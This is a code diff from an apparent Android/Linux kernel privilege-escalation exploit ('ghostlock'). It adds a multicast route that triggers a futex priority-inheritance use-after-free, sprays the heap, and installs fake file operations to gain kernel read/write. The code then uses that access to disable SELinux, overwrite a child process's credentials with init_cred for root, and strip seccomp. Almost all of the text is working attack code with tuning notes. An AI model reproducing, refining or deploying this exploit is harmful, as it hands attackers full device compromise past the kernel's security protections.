@@ -139,24 +139,38 @@ atomic_int consumer_futex_ret;
 atomic_int consumer_futex_errno;
 atomic_int consumer_futex_locked;
 atomic_int consumer_futex_entered;
-/* Punch mode: -1 = auto (mcast route -> 2, pselect route -> 0),
- * 0 = sched_setattr only (futex lock as fallback on failure),
- * 1 = FUTEX_LOCK_PI only, 2 = sched_setattr then FUTEX_LOCK_PI. Round-2
- * device logs showed sched_setattr alone succeeding (calls=1 success=1)
- * without a verified write, so the mcast route defaults to the direct
- * pi-chain walk (FUTEX_LOCK_PI on the target). Tuned by GHOSTLOCK_PUNCH
- * (env) or punch= (ghostlock.conf) before threads start. */
+/* Punch mode: -1 = auto (default 0 for both routes), 0 = sched_setattr only
+ * (futex lock as fallback on failure), 1 = FUTEX_LOCK_PI only, 2 = sched_setattr
+ * then FUTEX_LOCK_PI. A single sched_setattr punch suffices when the
+ * window is sustained by repeated setsockopt copies; mode 2 walks the PI
+ * chain a second time and is a hang source on the mcast route. Tuned by
+ * GHOSTLOCK_PUNCH (env) or punch= (ghostlock.conf) before threads start. */
 int punch_mode = -1;
 int punch_vary_nice = 0;
 int punch_max_calls = CONSUMER_MAX_CALLS;
 int punch_burst = PSELECT_CONSUMER_BURST_CALLS;
 int punch_delay_usec = -1;
 int memfd_leak;
+/* mcast socket is opened by waiter_thread before FUTEX_WAIT_REQUEUE_PI and
+ * kept open across route rounds (fops.c reuses it, never closes it). */
+int mcast_sock = -1;
 
 void *waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   int tid = (int)syscall(SYS_gettid);
   atomic_store(&waiter_tid, tid);
+  int use_mcast = active_offsets && active_offsets->mcast_payload_off;
+  if (use_mcast) {
+    /* Open the socket before the UAF is created: after WAIT_REQUEUE_PI the
+     * dangling pi_blocked_on points at this thread's stack waiter, and any
+     * deep syscall before the setsockopt copy refreshes it may trigger a
+     * stale-chain walk. */
+    mcast_sock = mcast_open_socket();
+    if (mcast_sock < 0) {
+      pr_error("mcast route: no IPv6 socket before UAF (last errno=%d %s)\n",
+               errno, strerror(errno));
+    }
+  }
   if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
     pr_error("waiter lock chain errno=%d\n", errno);
   atomic_store(&waiter_ready, 1);
@@ -165,15 +179,35 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
   timeout.tv_sec += ROUTE_WAIT_SECONDS;
   atomic_store(&waiter_waiting, 1);
-  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
-  if (active_offsets && active_offsets->mcast_payload_off) {
-    do_mcast_fake_lock_route();
+  if (use_mcast && mcast_sock < 0) {
+    /* No socket: do not create the UAF. Complete the f_pi_chain handshake so
+     * owner can finish and the round reports a clean route failure. */
+    atomic_store(&route_done, 1);
   } else {
-    do_pselect_fake_lock_route();
+    futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
+    if (use_mcast) {
+      do_mcast_fake_lock_route();
+    } else {
+      do_pselect_fake_lock_route();
+    }
+    atomic_store(&route_done, 1);
   }
-  atomic_store(&route_done, 1);
   futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
-  while (!atomic_load(&owner_chain_done)) usleep(1000);
+  if (use_mcast) {
+    /* No deep syscalls after the UAF: usleep could reschedule this thread
+     * and re-walk the dangling PI chain. Spin instead. The waiter must
+     * block forever: task->pi_blocked_on still points at this thread's
+     * stack, and exiting or freeing it makes any later PI walk touch freed
+     * memory. Route threads are never joined. */
+    while (!atomic_load(&owner_chain_done)) {
+      __asm__ volatile("yield" ::: "memory");
+    }
+    for (;;) {
+      __asm__ volatile("yield" ::: "memory");
+    }
+  } else {
+    while (!atomic_load(&owner_chain_done)) usleep(1000);
+  }
   return NULL;
 }
 
@@ -195,6 +229,7 @@ void *consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   pin_to_core(CONSUMER_CORE);
   pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
+  int use_mcast = active_offsets && active_offsets->mcast_payload_off;
   int seen = 0;
   while (!atomic_load(&punch_consume_stop)) {
     int seq = atomic_load(&punch_consume_go);
@@ -228,7 +263,13 @@ void *consumer_thread(void *arg __attribute__((unused))) {
           atomic_store(&consumer_sched_ret, (int)sched_ret);
           atomic_store(&consumer_sched_errno, errno);
         }
-        if (punch_mode == 1 || punch_mode == 2 || sched_ret != 0) {
+        /* mcast: FUTEX_LOCK_PI on f_pi_target walks the real pi_state chain,
+         * whose tree still references the overwritten stack waiter; the rb
+         * walk dereferences the fake tree_left/right and hangs. The
+         * one sched_setattr punch is sufficient, so never fall back to the
+         * futex punch on the mcast route. */
+        if (!use_mcast &&
+            (punch_mode == 1 || punch_mode == 2 || sched_ret != 0)) {
           /* FUTEX_LOCK_PI on the target walks the pi_state chain; the fake
            * waiter's pi_tree rb_erase fires the write during the enqueue. A
            * timeout/again return means the consumer was enqueued and walked
@@ -255,6 +296,12 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         calls_this_seq++;
         if (calls_this_seq >= punch_max_calls) {
           atomic_store(&punch_consume_go, 0);
+          if (use_mcast) {
+            /* mcast: punch exactly once, then hang forever. A second punch
+             * walks the dangling pi_blocked_on chain again while the stack
+             * is already overwritten by later syscalls — uncontrollable. */
+            for (;;) sleep(1);
+          }
           break;
         }
       }
@@ -283,6 +330,7 @@ void reset_main_route_state(void) {
 
 int run_main_route_threads(void) {
   reset_main_route_state();
+  int use_mcast = active_offsets && active_offsets->mcast_payload_off;
   pthread_t waiter, owner, consumer;
   SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
@@ -294,6 +342,15 @@ int run_main_route_threads(void) {
   futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
   while (!atomic_load(&route_done)) usleep(5000);
 
+  int landed = atomic_load(&consumer_calls) > 0 &&
+               atomic_load(&consumer_success) > 0 && cfi_last_step == 0;
+  if (use_mcast) {
+    /* mcast: route threads block forever (waiter holds its stack, owner
+     * holds the f_pi_target lock, consumer hangs). Never join here:
+     * joining waits for exit, and exit releases the stack/lock, which
+     * re-triggers the dangling PI chain and hangs. */
+    return landed;
+  }
   atomic_store(&punch_consume_go, 0);
   atomic_store(&punch_consume_stop, 1);
   atomic_store(&owner_stop, 1);
@@ -301,8 +358,7 @@ int run_main_route_threads(void) {
   pthread_join(owner, NULL);
   pthread_join(consumer, NULL);
 
-  return atomic_load(&consumer_calls) > 0 &&
-         atomic_load(&consumer_success) > 0 && cfi_last_step == 0;
+  return landed;
 }
 
 static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
@@ -640,7 +696,7 @@ static void parse_punch_knobs(void) {
     }
   }
   if (punch_mode < 0) {
-    punch_mode = (active_offsets && active_offsets->mcast_payload_off) ? 2 : 0;
+    punch_mode = 0;
   }
   pr_info("punch mode=%s vary_nice=%d calls=%d burst=%d delay_usec=%d\n",
           mode_names[punch_mode], punch_vary_nice,
@@ -1062,6 +1118,40 @@ int run_exploit(int argc, char **argv) {
   timer_reset();
   TIMER("exploit start");
 
+  /* mcast: the whole exploit runs a single route. The route creates the
+   * UAF and lands the write primitive (misc_fops <- fake_fops); the three
+   * route threads then block forever (waiter stack held, owner never
+   * unlocks, consumer stops punching) and the main thread does all
+   * W1/W2/W3 writes via configfs. Never re-open a route per stage like
+   * pselect: a fresh WAIT_REQUEUE_PI touches the already-overwritten
+   * dangling PI tree and hangs. */
+  int use_mcast = active_offsets && active_offsets->mcast_payload_off;
+  int mcast_fd = -1;
+  if (use_mcast) {
+    TIMER("mcast route: spray+land");
+    slab_drain();
+    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+    if (!page_base) {
+      pr_error("mcast heap spray failed\n");
+      return 1;
+    }
+    TIMER("mcast heap spray done");
+    int landed = run_main_route_threads();
+    TIMER("mcast PI route done");
+    if (!landed) {
+      pr_error("mcast punch did not land (calls=%d success=%d step=%d)\n",
+               atomic_load(&consumer_calls), atomic_load(&consumer_success),
+               cfi_last_step);
+      return 1;
+    }
+    mcast_fd = mcast_install_fake_fops();
+    if (mcast_fd < 0) {
+      pr_error("mcast configfs install failed step=%d errno=%d\n",
+               cfi_last_step, cfi_last_errno);
+      return 1;
+    }
+  }
+
   /* W1: disable SELinux before task discovery. untrusted_app may not be able
    * to read enforce while it is still enforcing, so attempt W1 regardless. */
   int selinux_ok = check_selinux_off();
@@ -1069,12 +1159,28 @@ int run_exploit(int argc, char **argv) {
     if (!enforce_readable()) {
       pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
     }
-    TIMER("pre-W1 drain");
-    selinux_ok = retry_write_stage(
-        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 8, 100000,
-        verify_selinux_stage, NULL, 0);
+    if (use_mcast) {
+      /* configfs write of selinux_enforcing = 0 (primitive is installed). */
+      uint32_t zero = 0;
+      for (int attempt = 1; attempt <= 5 && !selinux_ok; attempt++) {
+        ssize_t n = kernel_write_data(mcast_fd, data_addr(SELINUX_ENFORCING),
+                                      &zero, sizeof(zero));
+        log_flush_file();
+        usleep(150000);
+        selinux_ok = check_selinux_off();
+        pr_info("mcast W1 attempt=%d ret=%zd ok=%d\n", attempt, n, selinux_ok);
+      }
+    } else {
+      TIMER("pre-W1 drain");
+      selinux_ok = retry_write_stage(
+          "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 8, 100000,
+          verify_selinux_stage, NULL, 0);
+    }
     if (!selinux_ok) {
       pr_warning("Write 1 failed\n");
+      if (use_mcast && mcast_fd >= 0) {
+        mcast_restore_misc_fops(mcast_fd);
+      }
       return 1;
     }
     TIMER("Write 1 complete");
@@ -1139,14 +1245,35 @@ int run_exploit(int argc, char **argv) {
     pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
     pselect_child_node = 1;
 
-    int got_root = retry_write_stage(
-        "W2: cred", child_task + TASK_CRED_OFF, 2, 10, 50000,
-        verify_w2_stage, &w2_context, 0);
+    int got_root;
+    if (use_mcast) {
+      /* One route installed the arbitrary-write primitive: point the
+       * child's cred at init_cred directly, no re-route needed. Retry on
+       * failure; configfs writes never touch the futex tree. */
+      uintptr_t init_cred_data = data_addr(g_init_cred_image);
+      got_root = 0;
+      for (int attempt = 1; attempt <= 5 && !got_root; attempt++) {
+        ssize_t n = kernel_write_data(mcast_fd, child_task + TASK_CRED_OFF,
+                                      &init_cred_data,
+                                      sizeof(init_cred_data));
+        usleep(100000);
+        got_root = verify_w2_stage(&w2_context);
+        pr_info("mcast W2 attempt=%d ret=%zd ok=%d\n", attempt, n, got_root);
+        if (!got_root && attempt < 5) usleep(50000);
+      }
+    } else {
+      got_root = retry_write_stage(
+          "W2: cred", child_task + TASK_CRED_OFF, 2, 10, 50000,
+          verify_w2_stage, &w2_context, 0);
+    }
     if (!got_root) {
       write(pipes.cmd_w, "X", 1);
       close(pipes.cmd_w); close(pipes.uid_r);
       pr_warning("W2 failed after 10 rounds\n");
       waitpid(child, NULL, 0);
+      if (use_mcast && mcast_fd >= 0) {
+        mcast_restore_misc_fops(mcast_fd);
+      }
       return 1;
     }
 
@@ -1162,52 +1289,90 @@ int run_exploit(int argc, char **argv) {
       break;
     }
 
-    struct w3_stage_context w3_context = {
-      .pipes = &pipes,
-      .leaf_to_target8 = 1,
-    };
-    int dir_ok = retry_write_stage(
-        "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
-        verify_leaf_dir_stage, &w3_context, 1);
-    if (!dir_ok) {
-      pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
-    }
+    if (use_mcast) {
+      /* Exact configfs writes: read-modify-write thread_info.flags to
+       * clear TIF_SECCOMP (bit 11 on arm64, keep other flags), then zero
+       * seccomp.mode. fork() re-arms TIF_SECCOMP while mode != 0, so both
+       * must be cleared. */
+      uintptr_t flags_target = child_task + TASK_THREAD_INFO_FLAGS_OFF;
+      uintptr_t mode_target = child_task + TASK_SECCOMP_OFF;
+      for (int attempt = 1; attempt <= 6; attempt++) {
+        pr_info("mcast W3: TIF_SECCOMP+mode attempt %d/6\n", attempt);
+        if (attempt == 1) slab_drain();
+        uint64_t flags = 0;
+        ssize_t nr = kernel_read_data(mcast_fd, flags_target, &flags,
+                                      sizeof(flags));
+        uint64_t flags_want = (nr == (ssize_t)sizeof(flags))
+                                ? (flags & ~(1ULL << TIF_SECCOMP_BIT))
+                                : 0;
+        ssize_t nf = kernel_write_data(mcast_fd, flags_target, &flags_want,
+                                       sizeof(flags_want));
+        uint32_t mode_zero = 0;
+        ssize_t nm = kernel_write_data(mcast_fd, mode_target, &mode_zero,
+                                       sizeof(mode_zero));
+        usleep(50000);
+        int st = 0;
+        if (waitpid(child, &st, WNOHANG) == child) {
+          pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
+          child_alive = 0;
+          break;
+        }
+        if (verify_seccomp_probe_stage(&w2_context)) {
+          seccomp_ok = 1;
+          break;
+        }
+        pr_info("mcast W3 attempt=%d read=%zd write_flags=%zd write_mode=%zd\n",
+                attempt, nr, nf, nm);
+        usleep(50000);
+      }
+    } else {
+      struct w3_stage_context w3_context = {
+        .pipes = &pipes,
+        .leaf_to_target8 = 1,
+      };
+      int dir_ok = retry_write_stage(
+          "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
+          verify_leaf_dir_stage, &w3_context, 1);
+      if (!dir_ok) {
+        pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
+      }
 
-    uintptr_t flags_target = w3_context.leaf_to_target8
-      ? child_task - 8
-      : child_task + TASK_THREAD_INFO_FLAGS_OFF;
-    uintptr_t mode_target = w3_context.leaf_to_target8
-      ? child_task + TASK_SECCOMP_OFF - 8
-      : child_task + TASK_SECCOMP_OFF;
+      uintptr_t flags_target = w3_context.leaf_to_target8
+        ? child_task - 8
+        : child_task + TASK_THREAD_INFO_FLAGS_OFF;
+      uintptr_t mode_target = w3_context.leaf_to_target8
+        ? child_task + TASK_SECCOMP_OFF - 8
+        : child_task + TASK_SECCOMP_OFF;
 
-    for (int attempt = 1; attempt <= 6; attempt++) {
-      pr_info("W3: TIF_SECCOMP+mode attempt %d/6\n", attempt);
-      if (attempt == 1) slab_drain();
-      int routed = do_one_write(flags_target, "W3: TIF_SECCOMP", 1, 1);
-      if (!routed) {
-        pr_warning("W3 attempt %d route failed; backing off\n", attempt);
-        usleep(100000);
-        continue;
+      for (int attempt = 1; attempt <= 6; attempt++) {
+        pr_info("W3: TIF_SECCOMP+mode attempt %d/6\n", attempt);
+        if (attempt == 1) slab_drain();
+        int routed = do_one_write(flags_target, "W3: TIF_SECCOMP", 1, 1);
+        if (!routed) {
+          pr_warning("W3 attempt %d route failed; backing off\n", attempt);
+          usleep(100000);
+          continue;
+        }
+        usleep(50000);
+        routed = do_one_write(mode_target, "W3: seccomp mode", 1, 1);
+        if (!routed) {
+          pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
+          usleep(100000);
+          continue;
+        }
+        usleep(50000);
+        int st = 0;
+        if (waitpid(child, &st, WNOHANG) == child) {
+          pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
+          child_alive = 0;
+          break;
+        }
+        if (verify_seccomp_probe_stage(&w2_context)) {
+          seccomp_ok = 1;
+          break;
+        }
+        usleep(50000);
       }
-      usleep(50000);
-      routed = do_one_write(mode_target, "W3: seccomp mode", 1, 1);
-      if (!routed) {
-        pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
-        usleep(100000);
-        continue;
-      }
-      usleep(50000);
-      int st = 0;
-      if (waitpid(child, &st, WNOHANG) == child) {
-        pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
-        child_alive = 0;
-        break;
-      }
-      if (verify_seccomp_probe_stage(&w2_context)) {
-        seccomp_ok = 1;
-        break;
-      }
-      usleep(50000);
     }
 
     if (!seccomp_ok) {
@@ -1220,6 +1385,15 @@ int run_exploit(int argc, char **argv) {
 
   if (!seccomp_ok)
     pr_warning("W3 seccomp bypass failed after 3 chain rounds; ksud late-load will likely stay blocked\n");
+
+  if (use_mcast && mcast_fd >= 0) {
+    if (mcast_restore_misc_fops(mcast_fd)) {
+      pr_success("mcast misc_fops restored; ashmem back to real fops\n");
+    } else {
+      pr_warning("mcast misc_fops restore failed (step=%d errno=%d)\n",
+                 cfi_last_step, cfi_last_errno);
+    }
+  }
 
   sleep(2);
   TIMER("exploit complete");
